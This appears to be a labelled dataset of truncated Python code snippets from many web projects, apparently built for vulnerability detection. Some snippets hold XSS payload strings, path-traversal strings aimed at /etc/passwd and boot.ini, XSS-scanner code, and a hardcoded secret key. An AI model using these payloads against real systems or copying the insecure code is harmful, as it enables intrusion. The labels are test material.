app.secret_key='I Am Batman.' access_key=", "label": 0}, {"snippet_id": 49979, "code": ".internet.task import LoopingCall from django.utils.functional import Promise from django.utils.encoding import force_unicode from django.conf import settings from evennia.utils.ansi import parse_ansi from", "label": 0}, {"snippet_id": 15166, "code": " import os try: from pygments.console import colorize except ImportError: colorize=lambda color, text: text __test__=False DEFAULT_NUM_PROCESSES=1 DEFAULT_VERBOSITY=2 class BokChoyTestSuite(TestSuite): \"", "label": 0}, {"snippet_id": 26199, "code": ".settings.invoice_address_beneficiary: del self.fields['beneficiary'] def clean(self): data=self.cleaned_data if not data.get('is_business'): data['company']='' if self.event.settings.invoice_address_required", "label": 0}, {"snippet_id": 539, "code": "./Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers): if res_headers[", "label": 1}, {"snippet_id": 1751, "code": " methods=['GET']) def return_alerts(scanid): print \"ScanID is \",scanid result=fetch_records(scanid) resp=jsonify(result) resp.headers[\"Access-Control-Allow-Origin\"]=\"*\" return resp @app.route('/', defaults", "label": 0}, {"snippet_id": 27847, "code": " self.render_forbidden(exception.message) else: self.render('error.html', values, status) except Exception: self.handle_exception_exception() def handle_exception_exception(self): \"\"\"Catch exception in", "label": 0}, {"snippet_id": 47003, "code": " queryset=await ReactItem.filter( Q(user_id=user_id), Q(target_id__in=cids), Q(target_kind=K_COMMENT)) return[item.target_id for item in queryset] @comment_reacted.connect async def update_comment_list_cache", "label": 0}, {"snippet_id": 31655, "code": "(\"Date\", \"conn\", source=source, alpha=0.5, color=' \t\tp[serv].legend.orientation=\"horizontal\" \t\tp[serv].legend.location=\"top_left\" \t\tp[serv].legend.padding=5 \t\t \tplots=[] \tfor key, value in p.items(): \t", "label": 0}, {"snippet_id": 21495, "code": "]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses", "label": 0}, {"snippet_id": 39573, "code": ".fieldname))) \t\tif self.docstatus is not None: \t\t\tself.docstatus=cint(self.docstatus) \tdef _get_missing_mandatory_fields(self): \t\t\"\"\"Get mandatory fields that do not have any values\"\"\" \t\tdef get_msg(df", "label": 0}, {"snippet_id": 53622, "code": " bundled in enumerate(bundle.data['coordinators']): coord=coords[bundled['coordinator']] workflow=Workflow(document=coord.dependencies.all()[0]) wf_dir=Submission(request.user, workflow, request.fs, request", "label": 0}, {"snippet_id": 42264, "code": " \"DocPerm\") and self.parent in(\"DocType\", \"DocField\", \"DocPerm\"): \t\t\t\tfrom frappe.model.meta import get_table_columns \t\t\t\tvalid=get_table_columns(self.doctype) \t\t\telse: \t\t\t\tvalid=self.meta.get_valid_columns", "label": 0}, {"snippet_id": 36219, "code": " get_default_df \t\t\tdf=get_default_df(fieldname) \t\tval=self.get(fieldname) \t\tif translated: \t\t\tval=_(val) \t\tif absolute_value and isinstance(val,(int, float)): \t\t\tval=abs(self.get(fieldname)) \t\tif not doc:", "label": 0}, {"snippet_id": 48214, "code": "=request.POST[\"category\"] files=request.FILES.getlist('files') user: Profile=get_current_user(request) for f in files: handle_file(user, str(f.name), category, \" except Exception as e: return redirect(\"", "label": 0}, {"snippet_id": 13765, "code": ".pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^", "label": 1}, {"snippet_id": 13027, "code": "'): admin.autodiscover() urlpatterns=('', url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard", "label": 0}, {"snippet_id": 28614, "code": "'https': proxy} \ttry: \t\tbot=telebot.TeleBot(token=token_bot) \t\tbot.send_message(chat_id=channel_name, text=mess) \texcept: \t\tprint(\"Fatal: Can't send message. Add Telegram chanel before use alerting at this", "label": 0}, {"snippet_id": 26528, "code": "%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '../../etc/passwd%00', '.", "label": 0}, {"snippet_id": 33581, "code": "')=tabBlogger.name) \t\t\twhere name=%s\"\"\",(self.blogger,)) \tdef on_update(self): \t\tclear_cache(\"writers\") \tdef get_context(self, context): \t\t \t\tif not cint(self.published): \t\t\traise Exception(\"This blog has", "label": 0}, {"snippet_id": 46140, "code": ".user), 'is_embeddable': request.GET.get('is_embeddable', False), 'mobile': is_mobile, }) def index_m(request): return index(request, True) def new_search(request): engine=request.GET.get('engine', 'solr')", "label": 0}, {"snippet_id": 5560, "code": "\"\"\"<img style=\"xss:expr/*xss*/ession(alert('xss'))\"> \"\"\", \"\"\"<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('xss');\">\"\"\", \"\"\"<meta http-equiv=\"refresh\" content=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K", "label": 0}, {"snippet_id": 26247, "code": "): self.instance.vat_id_validated=False self.instance.name_parts=data.get('name_parts') if self.validate_vat_id and self.instance.vat_id_validated and 'vat_id' not in self.changed_data: pass elif self.validate_vat_id", "label": 0}, {"snippet_id": 30552, "code": ".get_setting('apache_log_path') \t \tif grep is not None: \t\tgrep_act ='|grep' \telse: \t\tgrep_act='' \t\tgrep='' \t\t \tif serv=='haproxy-wi.access.log': \t\tcmd=\"cat %s| awk -F\\\"/|:\\\" '$3>\\\"%s:00\\\" && $3<\\\"%s:00\\\"' |tail", "label": 0}, {"snippet_id": 6220, "code": " Path to CherryPy logfiles(string). Something like '/var/log/idp' maybe. \"\"\" res=self.config.get(self.section, 'logdir') if not res: res=None return res @property def logfile(self): \"\"\" Path to application", "label": 0}, {"snippet_id": 26675, "code": "'../../../../../../../../boot.ini', '%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e", "label": 0}, {"snippet_id": 34434, "code": "(key, filters=filters, limit=1)[0] \tdef set(self, key, value, as_value=False): \t\tif isinstance(value, list) and not as_value: \t\t\tself.__dict__[key]=[] \t\t\tself.extend(key, value) \t\telse: \t\t\tself.__dict__", "label": 0}, {"snippet_id": 24921, "code": "=(\" \").join(cmd) return cmd class Pa11yCrawler(BokChoyTestSuite): \"\"\" Sets up test environment with mega-course loaded, and runs pa11ycralwer against it. \"\"\" def __init__(self, *args, **kwargs): super(Pa11yCrawler", "label": 0}, {"snippet_id": 4939, "code": "=x oNERror=(prompt)`` x>', '<deTails open oNToggle=confi\\u0072m()>', '<img sRc=l oNerrOr=(confirm)() x>', '<svg/x=\">\"/onload=confirm()//', '<svg%0Aonload=%09((pro\\u006dpt))()//', '<iMg sRc=x:confirm`` oNlOad", "label": 0}, {"snippet_id": 42001, "code": " in value: \t\t\t\tself.append(key, v) \t\telse: \t\t\traise ValueError \tdef remove(self, doc): \t\tself.get(doc.parentfield).remove(doc) \tdef _init_child(self, value, key): \t\tif not self.doctype: \t\t\treturn value \t", "label": 0}, {"snippet_id": 16226, "code": "[0-9A-Za-z]+)-(?P<token>.+)/$', 'student.views.password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete", "label": 0}, {"snippet_id": 15088, "code": " suite.get_test_course() self._mock_sh.assert_has_calls([ call( 'wget{targz} -O{dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)), call( 'tar zxf{dir}demo_course.tar.gz -C{dir}", "label": 0}, {"snippet_id": 51327, "code": "=Fernet(settings.FIELD_ENCRYPTION_KEY) encrypted=f.encrypt(obj.internet_nl_api_password.encode()) obj.internet_nl_api_password=encrypted super().save_model(request, obj, form, change) actions=[] @admin", "label": 0}, {"snippet_id": 20048, "code": "--traceback --noinput\") bokchoy_utils.clear_mongo() def verbosity_processes_string(self): \"\"\" Multiprocessing, xunit, color, and verbosity do not work well together. We need to construct the proper combination", "label": 0}, {"snippet_id": 50584, "code": " self.mode_receive(request) elif dmode=='close': return self.mode_close(request) elif dmode=='keepalive': return self.mode_keepalive(request) else: return '\"\"' class AjaxWebClientSession(session.Session", "label": 0}, {"snippet_id": 29725, "code": " kwargs.get('ret'): \t\t\t\tret +=back[1] \t\t\t\tret +=\"<br />\" \t\t\telse: \t\t\t\tprint(back[1], end=\"<br>\") \t\t \tif kwargs.get('ret'): \t\treturn ret \t\t def get_files(dir=get_config_var('configs', 'haproxy_save_configs_dir", "label": 0}, {"snippet_id": 18285, "code": ", name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id", "label": 1}, {"snippet_id": 26787, "code": "%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e", "label": 0}, {"snippet_id": 18561, "code": "), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'), url", "label": 0}, {"snippet_id": 22044, "code": "('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'): urlpatterns +=( url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'), ) if settings.MITX_FEATURES.get", "label": 0}, {"snippet_id": 49240, "code": ") else: new_query.append(column) return self.get_url_with_query_params({ self.ordering_query_param: \".\".join(new_query) }) class SmartColumn(TitleFromModelFieldMixin, object): def __init__(self, model,", "label": 0}, {"snippet_id": 31026, "code": ".syn_flood_protect(master) \t\tfunct.syn_flood_protect(slave) \t \tos.system(\"cp scripts/%s.\" % script) \t\t \terror=str(funct.upload(master, tmp_config_path, script)) \tif error: \t\tprint('error: '+error) \t\tsys.exit() \tfunct", "label": 0}, {"snippet_id": 48137, "code": "+high_res_file_name m.lowResFile=\"/\" +low_res_file_name m.headline=headline m.save() mu: MediaUpload=MediaUpload() mu.UID=u mu.MID=m mu.save() logging.info(\"Uploaded file '\" +str(file.name) +\"' and cropped", "label": 1}, {"snippet_id": 54121, "code": "\"[*]Test was finished at:{}\\n[*]Duration:{} seconds\\n\".format(datetime.now().strftime(\"%d/%m/%Y %H:%M:%S\"),int(time.time()-ti))) print(\"=\"*25) stop=False def scan(): sc().start() class ki(threading.Thread", "label": 0}, {"snippet_id": 8728, "code": ", kwargs={'org_id': 'RiceX'}), url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile", "label": 0}, {"snippet_id": 4301, "code": " self).__init__() self.url=url @staticmethod def alterTest(self, p=False): return \"<script>alert(/xss/)</script>\" def img(self): payload=\"<img src='%s'></img>\" % self.url return payload def script(self):", "label": 1}, {"snippet_id": 3588, "code": "\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result,db_update=True,True vul_param", "label": 0}, {"snippet_id": 2588, "code": "{\"$set\":{\"scan_data\": post_vul_param+\" are vulnerable to XSS\"}}) def xss_http_headers(url,method,headers,body,scanid=None): temp_headers={} temp_headers.update(headers) xss_payloads=fetch_xss_payload()", "label": 0}, {"snippet_id": 18778, "code": "<location>.*?)$', 'courseware.views.submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/', include('django_jasmine.urls')),) if settings.DEBUG or", "label": 0}, {"snippet_id": 36288, "code": " \"field2\"] \t\t:param fieldname: Fieldname to be checked if hidden. \t\t\"\"\" \t\tmeta_df=self.meta.get_field(fieldname) \t\tif meta_df and meta_df.get(\"__print_hide\"): \t\t\treturn True \t\tprint_hide=0 \t\tif self.get", "label": 0}, {"snippet_id": 24429, "code": ".report_dir / \"xunit.xml\" self.cache=Env.BOK_CHOY_CACHE self.fasttest=kwargs.get('fasttest', False) self.serversonly=kwargs.get('serversonly', False) self.testsonly=kwargs.get('testsonly', False) self.test_spec", "label": 0}, {"snippet_id": 28608, "code": "\tif proxy is not None: \t\tapihelper.proxy={'https': proxy} \ttry: \t\tbot=telebot.TeleBot(token=token_bot) \t\tbot.send_message(chat_id=channel_name, text=mess) \texcept: \t\tprint(\"Fatal: Can't send message. Add", "label": 0}, {"snippet_id": 30375, "code": "% errc) \texcept requests.exceptions.Timeout as errt: \t\tprint(\"Timeout Error:\",errt) \texcept requests.exceptions.RequestException as err: \t\tprint(\"OOps: Something Else\",err) \t\t \tdata=response.content \tprint", "label": 0}, {"snippet_id": 50267, "code": "() host_string=\"%s(%s:%s)\" %(_SERVERNAME, request.getRequestHostname(), request.getHost().port) sess=AjaxWebClientSession() sess.client=self sess.init_session(\"ajax/comet\", remote_addr, self.sessionhandler", "label": 0}, {"snippet_id": 34909, "code": " \t\t\t\tdoc[key]=self.get(key) \t\treturn doc \tdef as_json(self): \t\treturn frappe.as_json(self.as_dict()) \tdef get_table_field_doctype(self, fieldname): \t\treturn self.meta.get_field(fieldname).options \tdef get_parentfield_of_doctype", "label": 0}, {"snippet_id": 29107, "code": " script) \t \tcommands=[ \"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+\" \"+enable] \t \terror=str(upload(serv, tmp_config_path, script)) \tif error: \t\tprint('error: '+error) \tos.system(\"rm", "label": 0}, {"snippet_id": 50396, "code": ".data_in(sess, **{cmdarray[0]:[cmdarray[1], cmdarray[2]]}) return '\"\"' def mode_receive(self, request): \"\"\" This is called by render_POST when the client is telling us that it is ready to receive data as", "label": 0}, {"snippet_id": 54313, "code": "(main, values=ua) user_agent.current(1) global payload payload=ttk.Combobox(main, values=pl) payload.current(0) global proxy proxy=ttk.Combobox(main, values=prox) global refresh refresh=ttk.Combobox(main,", "label": 0}, {"snippet_id": 31356, "code": "\tsource=ColumnDataSource(df) \t\t \t\toutput_file(\"templates/metrics_out.html\", mode='inline') \t\t \t\tx_min=df.index.min() -pd.Timedelta(hours=1) \t\tx_max=df.index.max() +pd.Timedelta(minutes=1) \t\tp[serv]=figure", "label": 0}, {"snippet_id": 32218, "code": "(os.path.dirname(__file__)) SRC_DIR=os.path.dirname(os.path.dirname(THIS_DIR)) sys.path.insert(0, os.path.join(SRC_DIR, 'third_party', 'Python-Markdown')) import markdown def main(argv): parser=argparse", "label": 0}, {"snippet_id": 18904, "code": "/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider", "label": 0}, {"snippet_id": 14616, "code": "--with-xunit \" \"--xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml \" \"--verbosity=2 \" ).format( default_store=store, repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '',", "label": 0}, {"snippet_id": 49243, "code": " self.get_url_with_query_params({ self.ordering_query_param: \".\".join(new_query) }) class SmartColumn(TitleFromModelFieldMixin, object): def __init__(self, model, field, column_id, query_params, ordering_query_param", "label": 0}, {"snippet_id": 43599, "code": "._precision[cache_key]=frappe._dict() \t\tif fieldname not in self._precision[cache_key]: \t\t\tself._precision[cache_key][fieldname]=None \t\t\tdoctype=self.meta.get_field(parentfield).options if parentfield else", "label": 0}, {"snippet_id": 28262, "code": "\tfor master in MASTERS: \t\tif master[0] !=None: \t\t\tfunct.upload_and_restart(master[0], cfg, just_save=save) \t\t \tstderr=funct.upload_and_restart(serv, cfg, just_save=save) \t\t \tfunct.diff_config(oldcfg, cfg", "label": 0}, {"snippet_id": 42731, "code": ": Value missing for{0}:{1}\").format(_(df.parent), _(df.label)) \t\tmissing=[] \t\tfor df in self.meta.get(\"fields\",{\"reqd\":('=', 1)}): \t\t\tif self.get(df.fieldname) in(None,[]) or not strip_html(cstr(self.get", "label": 0}, {"snippet_id": 2850, "code": " impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) def xss_get_uri(url,method,headers,body,scanid", "label": 0}, {"snippet_id": 45492, "code": "=Submission(request.user, coordinator, request.fs, request.jt, properties=properties) job_id=submission.run() return job_id except RestException, ex: raise PopupException(_(\"Error submitting coordinator %s\") %", "label": 0}, {"snippet_id": 50570, "code": "=='init': return self.mode_init(request) elif dmode=='input': return self.mode_input(request) elif dmode=='receive': return self.mode_receive(request) elif dmode=='close': return self.mode_close(request", "label": 0}, {"snippet_id": 20839, "code": "=\"static_university_profile\", kwargs={'org_id': 'McGillX'}), url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': ", "label": 0}, {"snippet_id": 10735, "code": ", **kwargs): super(BokChoyTestSuite, self).__init__(*args, **kwargs) self.test_dir=Env.BOK_CHOY_DIR / kwargs.get('test_dir', 'tests') self.log_dir=Env.BOK_CHOY_LOG_DIR self.report_dir=kwargs.get('report_dir", "label": 0}, {"snippet_id": 46223, "code": "': query, 'initial': json.dumps({ 'collections': collections, 'layout': DEFAULT_LAYOUT, 'is_latest': LATEST.get(), 'engines': get_engines(request.user) }), 'is_owner': True, 'is_embeddable': request.GET", "label": 0}, {"snippet_id": 26162, "code": ", ) if event.settings.invoice_address_required and not event.settings.invoice_address_company_required and not self.all_optional: self.fields['name_parts'].widget.attrs['data-required-if']=' self.fields", "label": 0}, {"snippet_id": 52943, "code": ".objects.get(id=coordinator_id) coordinator=Coordinator(document=doc) else: coordinator=Coordinator() api=get_oozie(request.user) credentials=Credentials() try: credentials.fetch(api) except Exception, e:", "label": 0}, {"snippet_id": 10009, "code": "(unittest.TestCase): \"\"\" Paver Bok Choy Command test cases \"\"\" def _expected_command(self, name, store=None, verify_xss=False): \"\"\" Returns the command that is expected to be run for the given test spec and", "label": 1}, {"snippet_id": 34694, "code": "\t\t\t\t\td[fieldname]=cint(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Currency\", \"Float\", \"Percent\") and not isinstance(d[fieldname], float): \t\t\t\t\td[fieldname]=flt(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Datetime", "label": 0}, {"snippet_id": 22361, "code": "\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}), url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}), url(r'^", "label": 0}, {"snippet_id": 12439, "code": "', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$', 'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list", "label": 0}, {"snippet_id": 30125, "code": "'/' '{ print $1 }'\"] \tfunct.ssh_command(serv, commands, ip=\"1\") \t if form.getvalue('showif'): \tcommands=[\"sudo ip link|grep 'UP' | awk '{print $2}' |awk -F':' '{print $1}'\"] \tfunct.ssh_command(serv, commands", "label": 0}, {"snippet_id": 50523, "code": " This function is what Twisted calls with POST requests coming in from the ajax client. The requests should be tagged with different modes depending on what needs to be done, such as initializing or sending", "label": 0}, {"snippet_id": 25604, "code": ".attendee_names_asked: self.fields['attendee_name_parts']=NamePartsFormField( max_length=255, required=event.settings.attendee_names_required, scheme=event.settings.name_scheme, label=_('Attendee name'", "label": 0}, {"snippet_id": 38877, "code": " BaseDocument, not{2}({3})'.format(key, \t\t\t\t\tself.name, str(type(value))[1:-1], value) \t\t\t) \tdef extend(self, key, value): \t\tif isinstance(value, list): \t\t\tfor v in value: \t\t\t\tself.append(key, v) \t\telse: \t\t", "label": 0}, {"snippet_id": 29709, "code": " haproxy_sock_port) \toutput, stderr=subprocess_execute(cmd) \tret=\"\" \tfor line in output: \t\tif \" \t\t\tcontinue \t\tif line !=\"\": \t\t\tback=json.dumps(line).split(\"\\\"\") \t\t\tif kwargs.get('ret'): \t\t\t\tret +=back[1] \t\t\t\tret +=\"", "label": 0}, {"snippet_id": 38925, "code": "\t\tvalue[\"doctype\"]=self.get_table_field_doctype(key) \t\t\t\tif not value[\"doctype\"]: \t\t\t\t\traise AttributeError(key) \t\t\tvalue=get_controller(value[\"doctype\"])(value) \t\t\tvalue.init_valid_columns() \t\tvalue.parent", "label": 0}, {"snippet_id": 32636, "code": ": self._DoUnknown() def _DoMD(self, path): extensions=[ 'markdown.extensions.def_list', 'markdown.extensions.fenced_code', 'markdown.extensions.tables', 'markdown.extensions.toc', 'gitiles_autolink', 'gitiles_ext_blocks", "label": 0}, {"snippet_id": 39866, "code": "\tinvalid_links.append((df.fieldname, docname, get_msg(df, docname))) \t\t\t\t\telif(df.fieldname !=\"amended_from\" \t\t\t\t\t\tand(is_submittable or self.meta.is_submittable) and frappe.get_meta(doctype).is_submittable \t\t\t\t", "label": 0}, {"snippet_id": 6881, "code": " from the attribute manager. \"\"\" return self.config.get(self.section, 'default_scoped_affiliation') @property def vccs_url(self): \"\"\" URL to use with VCCS client. BCP is to have an nginx or similar on localhost", "label": 0}, {"snippet_id": 18619, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/", "label": 0}, {"snippet_id": 14778, "code": " self.assertEqual(suite.cmd, \"\") def test_verify_xss(self): suite=BokChoyTestSuite('', verify_xss=True) name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_verify_xss_env_var", "label": 1}, {"snippet_id": 52519, "code": " response={'status': -1} node=json.loads(request.POST.get('node', '{}')) properties=json.loads(request.POST.get('properties', '{}')) copied_properties=json.loads(request.POST.get('copiedProperties', '{}'))", "label": 0}, {"snippet_id": 18729, "code": " +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ", "label": 0}, {"snippet_id": 18167, "code": "), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name", "label": 0}, {"snippet_id": 26549, "code": "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '../../etc/passwd%00', '../../../etc/passwd%00', '../../../../etc/passwd%00', '../../../../../etc/passwd%00', '../../../../../../etc/passwd%00', '../..", "label": 0}, {"snippet_id": 4501, "code": ") @staticmethod def fuzzUnicodeReplace(s, cnt=1): s=s.replace(\"A\", \"\u0100\", cnt) s=s.replace(\"A\", \"\u0102\", cnt) s=s.replace(\"A\", \"\u0104\", cnt) s=s.replace(\"a\", \"\u03b1\", cnt) s=s.replace(\"e\", \"\u0435\", cnt) s=s.replace(\"a\",", "label": 0}, {"snippet_id": 44372, "code": "'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user)) }) def new_workflow(request): return edit_workflow(request) def delete_workflow(request): if request.method !='POST': raise", "label": 0}, {"snippet_id": 23125, "code": "/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'), url(r'^courses/(?P<course_id>[^/]+/[^/]+", "label": 0}, {"snippet_id": 5998, "code": "'eduid_idp', version=version, description=\"eduID SAML frontend IdP\", long_description=README, classifiers=[ ], keywords='eduID SAML', author='Fredrik Thulin', author_email='fredrik@thulin.net', license='BSD',", "label": 0}, {"snippet_id": 37480, "code": "\tcategory_title=get_blog_category(category) \t\tlist_context.sub_title=_(\"Posts filed under{0}\").format(category_title) \t\tlist_context.title=category_title \telif frappe.local.form_dict.blogger: \t\tblogger=frappe", "label": 0}, {"snippet_id": 40889, "code": " \t\t\t\t\tfval=(\"not None\", fval) \t\t\t\telif fval is False: \t\t\t\t\tfval=(\"None\", fval) \t\t\t\telif isinstance(fval, string_types) and fval.startswith(\"^\"): \t\t\t\t\tfval=(\"^\", fval[1:]) \t\t\t\telse: \t\t\t\t\tfval=(\"=\", fval", "label": 0}, {"snippet_id": 14089, "code": " name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt\"), url(r'^courses/(?P<course_id>[^/]+/[^/]", "label": 0}, {"snippet_id": 14512, "code": "/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager', name=\"hint_manager\"), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root", "label": 0}, {"snippet_id": 36619, "code": "\torder_by=\"published_on desc\" \t) \tdef make_route(self): \t\tif not self.route: \t\t\treturn frappe.db.get_value('Blog Category', self.blog_category, \t\t\t\t'route') +'/' +self.scrub(self.title) \tdef get_feed(self", "label": 0}, {"snippet_id": 28679, "code": "=login.py?ref=%s\">' % ref) \telse: \t\tprint('<meta http-equiv=\"refresh\" content=\"0; url=login.py?ref=%s\">' % ref) \t\t\t\t def is_admin(**kwargs): \timport sql \timport http.cookies \tcookie=http.cookies.SimpleCookie", "label": 0}, {"snippet_id": 8633, "code": ".password_change, name='auth_password_change'), url(r'^password_change_done/$', django.contrib.auth.views.password_change_done, name='auth_password_change_done'), url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+", "label": 0}, {"snippet_id": 54483, "code": " django.core.paginator import EmptyPage, PageNotAnInteger, Paginator from django.http import HttpResponse from django.urls import reverse from django.template import RequestContext from django.shortcuts", "label": 0}, {"snippet_id": 15396, "code": ".har_dir.makedirs_p() self.report_dir.makedirs_p() test_utils.clean_reports_dir() if not(self.fasttest or self.skip_clean or self.testsonly): test_utils.clean_test_files() msg=colorize('green', \"Checking", "label": 0}, {"snippet_id": 26350, "code": " as the VAT checking service of ' 'your country is currently not available. We will therefore ' 'need to charge VAT on your invoice. You can get the tax amount ' 'back via the VAT reimbursement process", "label": 0}, {"snippet_id": 41760, "code": "\t\tself.set(key, value) \t\treturn self \tdef update_if_missing(self, d): \t\tif isinstance(d, BaseDocument): \t\t\td=d.get_valid_dict() \t\tif \"doctype\" in d: \t\t\tself.set(\"doctype\", d.get(\"doctype\")) \t\tfor key, value", "label": 0}, {"snippet_id": 34685, "code": "]) else 0 \t\t\t\telif df.fieldtype==\"Int\" and not isinstance(d[fieldname], int): \t\t\t\t\td[fieldname]=cint(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Currency\", \"Float\", \"Percent\") and not isinstance(d[fieldname", "label": 0}, {"snippet_id": 4979, "code": ">', '<base href=//t.cn/><script src=/>', '<object//data=//t.cn>', '<s=\" onclick=confirm``>clickme', '<svG oNLoad=co\\u006efirm& '\\'\"><y///oNMousEDown=((confirm))()>Click', '<a/href=javascript&colon;co\\u006efirm", "label": 0}, {"snippet_id": 20678, "code": ".accept_name_change'), url(r'^reject_name_change$', 'student.views.reject_name_change'), url(r'^pending_name_changes$', 'student.views.pending_name_changes'), url(r'^event$', 'track.views.user_track'), url(r'^t/(?P", "label": 0}, {"snippet_id": 48686, "code": " HttpResponseRedirect=HttpResponseRedirect(forward_url +\"?rid=\" +str(r.id)) return response def action_delete_article(request: HttpRequest): \"\"\" This function removes an article from the reservation and", "label": 0}, {"snippet_id": 44, "code": " in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers): if res_headers['Content-Type']: if 'application/json' or 'text/plain'in xss_request['Content-Type", "label": 1}, {"snippet_id": 39038, "code": " not isinstance(d[fieldname], int): \t\t\t\t\td[fieldname]=cint(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Currency\", \"Float\", \"Percent\") and not isinstance(d[fieldname], float): \t\t\t\t\td[fieldname]=flt(d[fieldname", "label": 0}, {"snippet_id": 24713, "code": " bokchoy_utils.start_servers(self.default_store, self.coveragerc) def load_courses(self): \"\"\" Loads courses from self.imports_dir. Note: self.imports_dir is the directory that contains the directories that have", "label": 0}, {"snippet_id": 34643, "code": " \t\tfor fieldname in self.meta.get_valid_columns(): \t\t\td[fieldname]=self.get(fieldname) \t\t\t \t\t\tif not sanitize and d[fieldname] is None: \t\t\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname) \t\t\tif df: \t\t\t\tif", "label": 0}, {"snippet_id": 23954, "code": " the traditional xunit plugin for plugin results \"\"\" expected_verbosity_string=( \"--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2\".format( repo_dir=REPO_DIR, shard_str", "label": 0}, {"snippet_id": 51834, "code": "'color', }, }, 'formatters':{ 'debug':{ 'format': '%(asctime)s\\t%(levelname)-8s 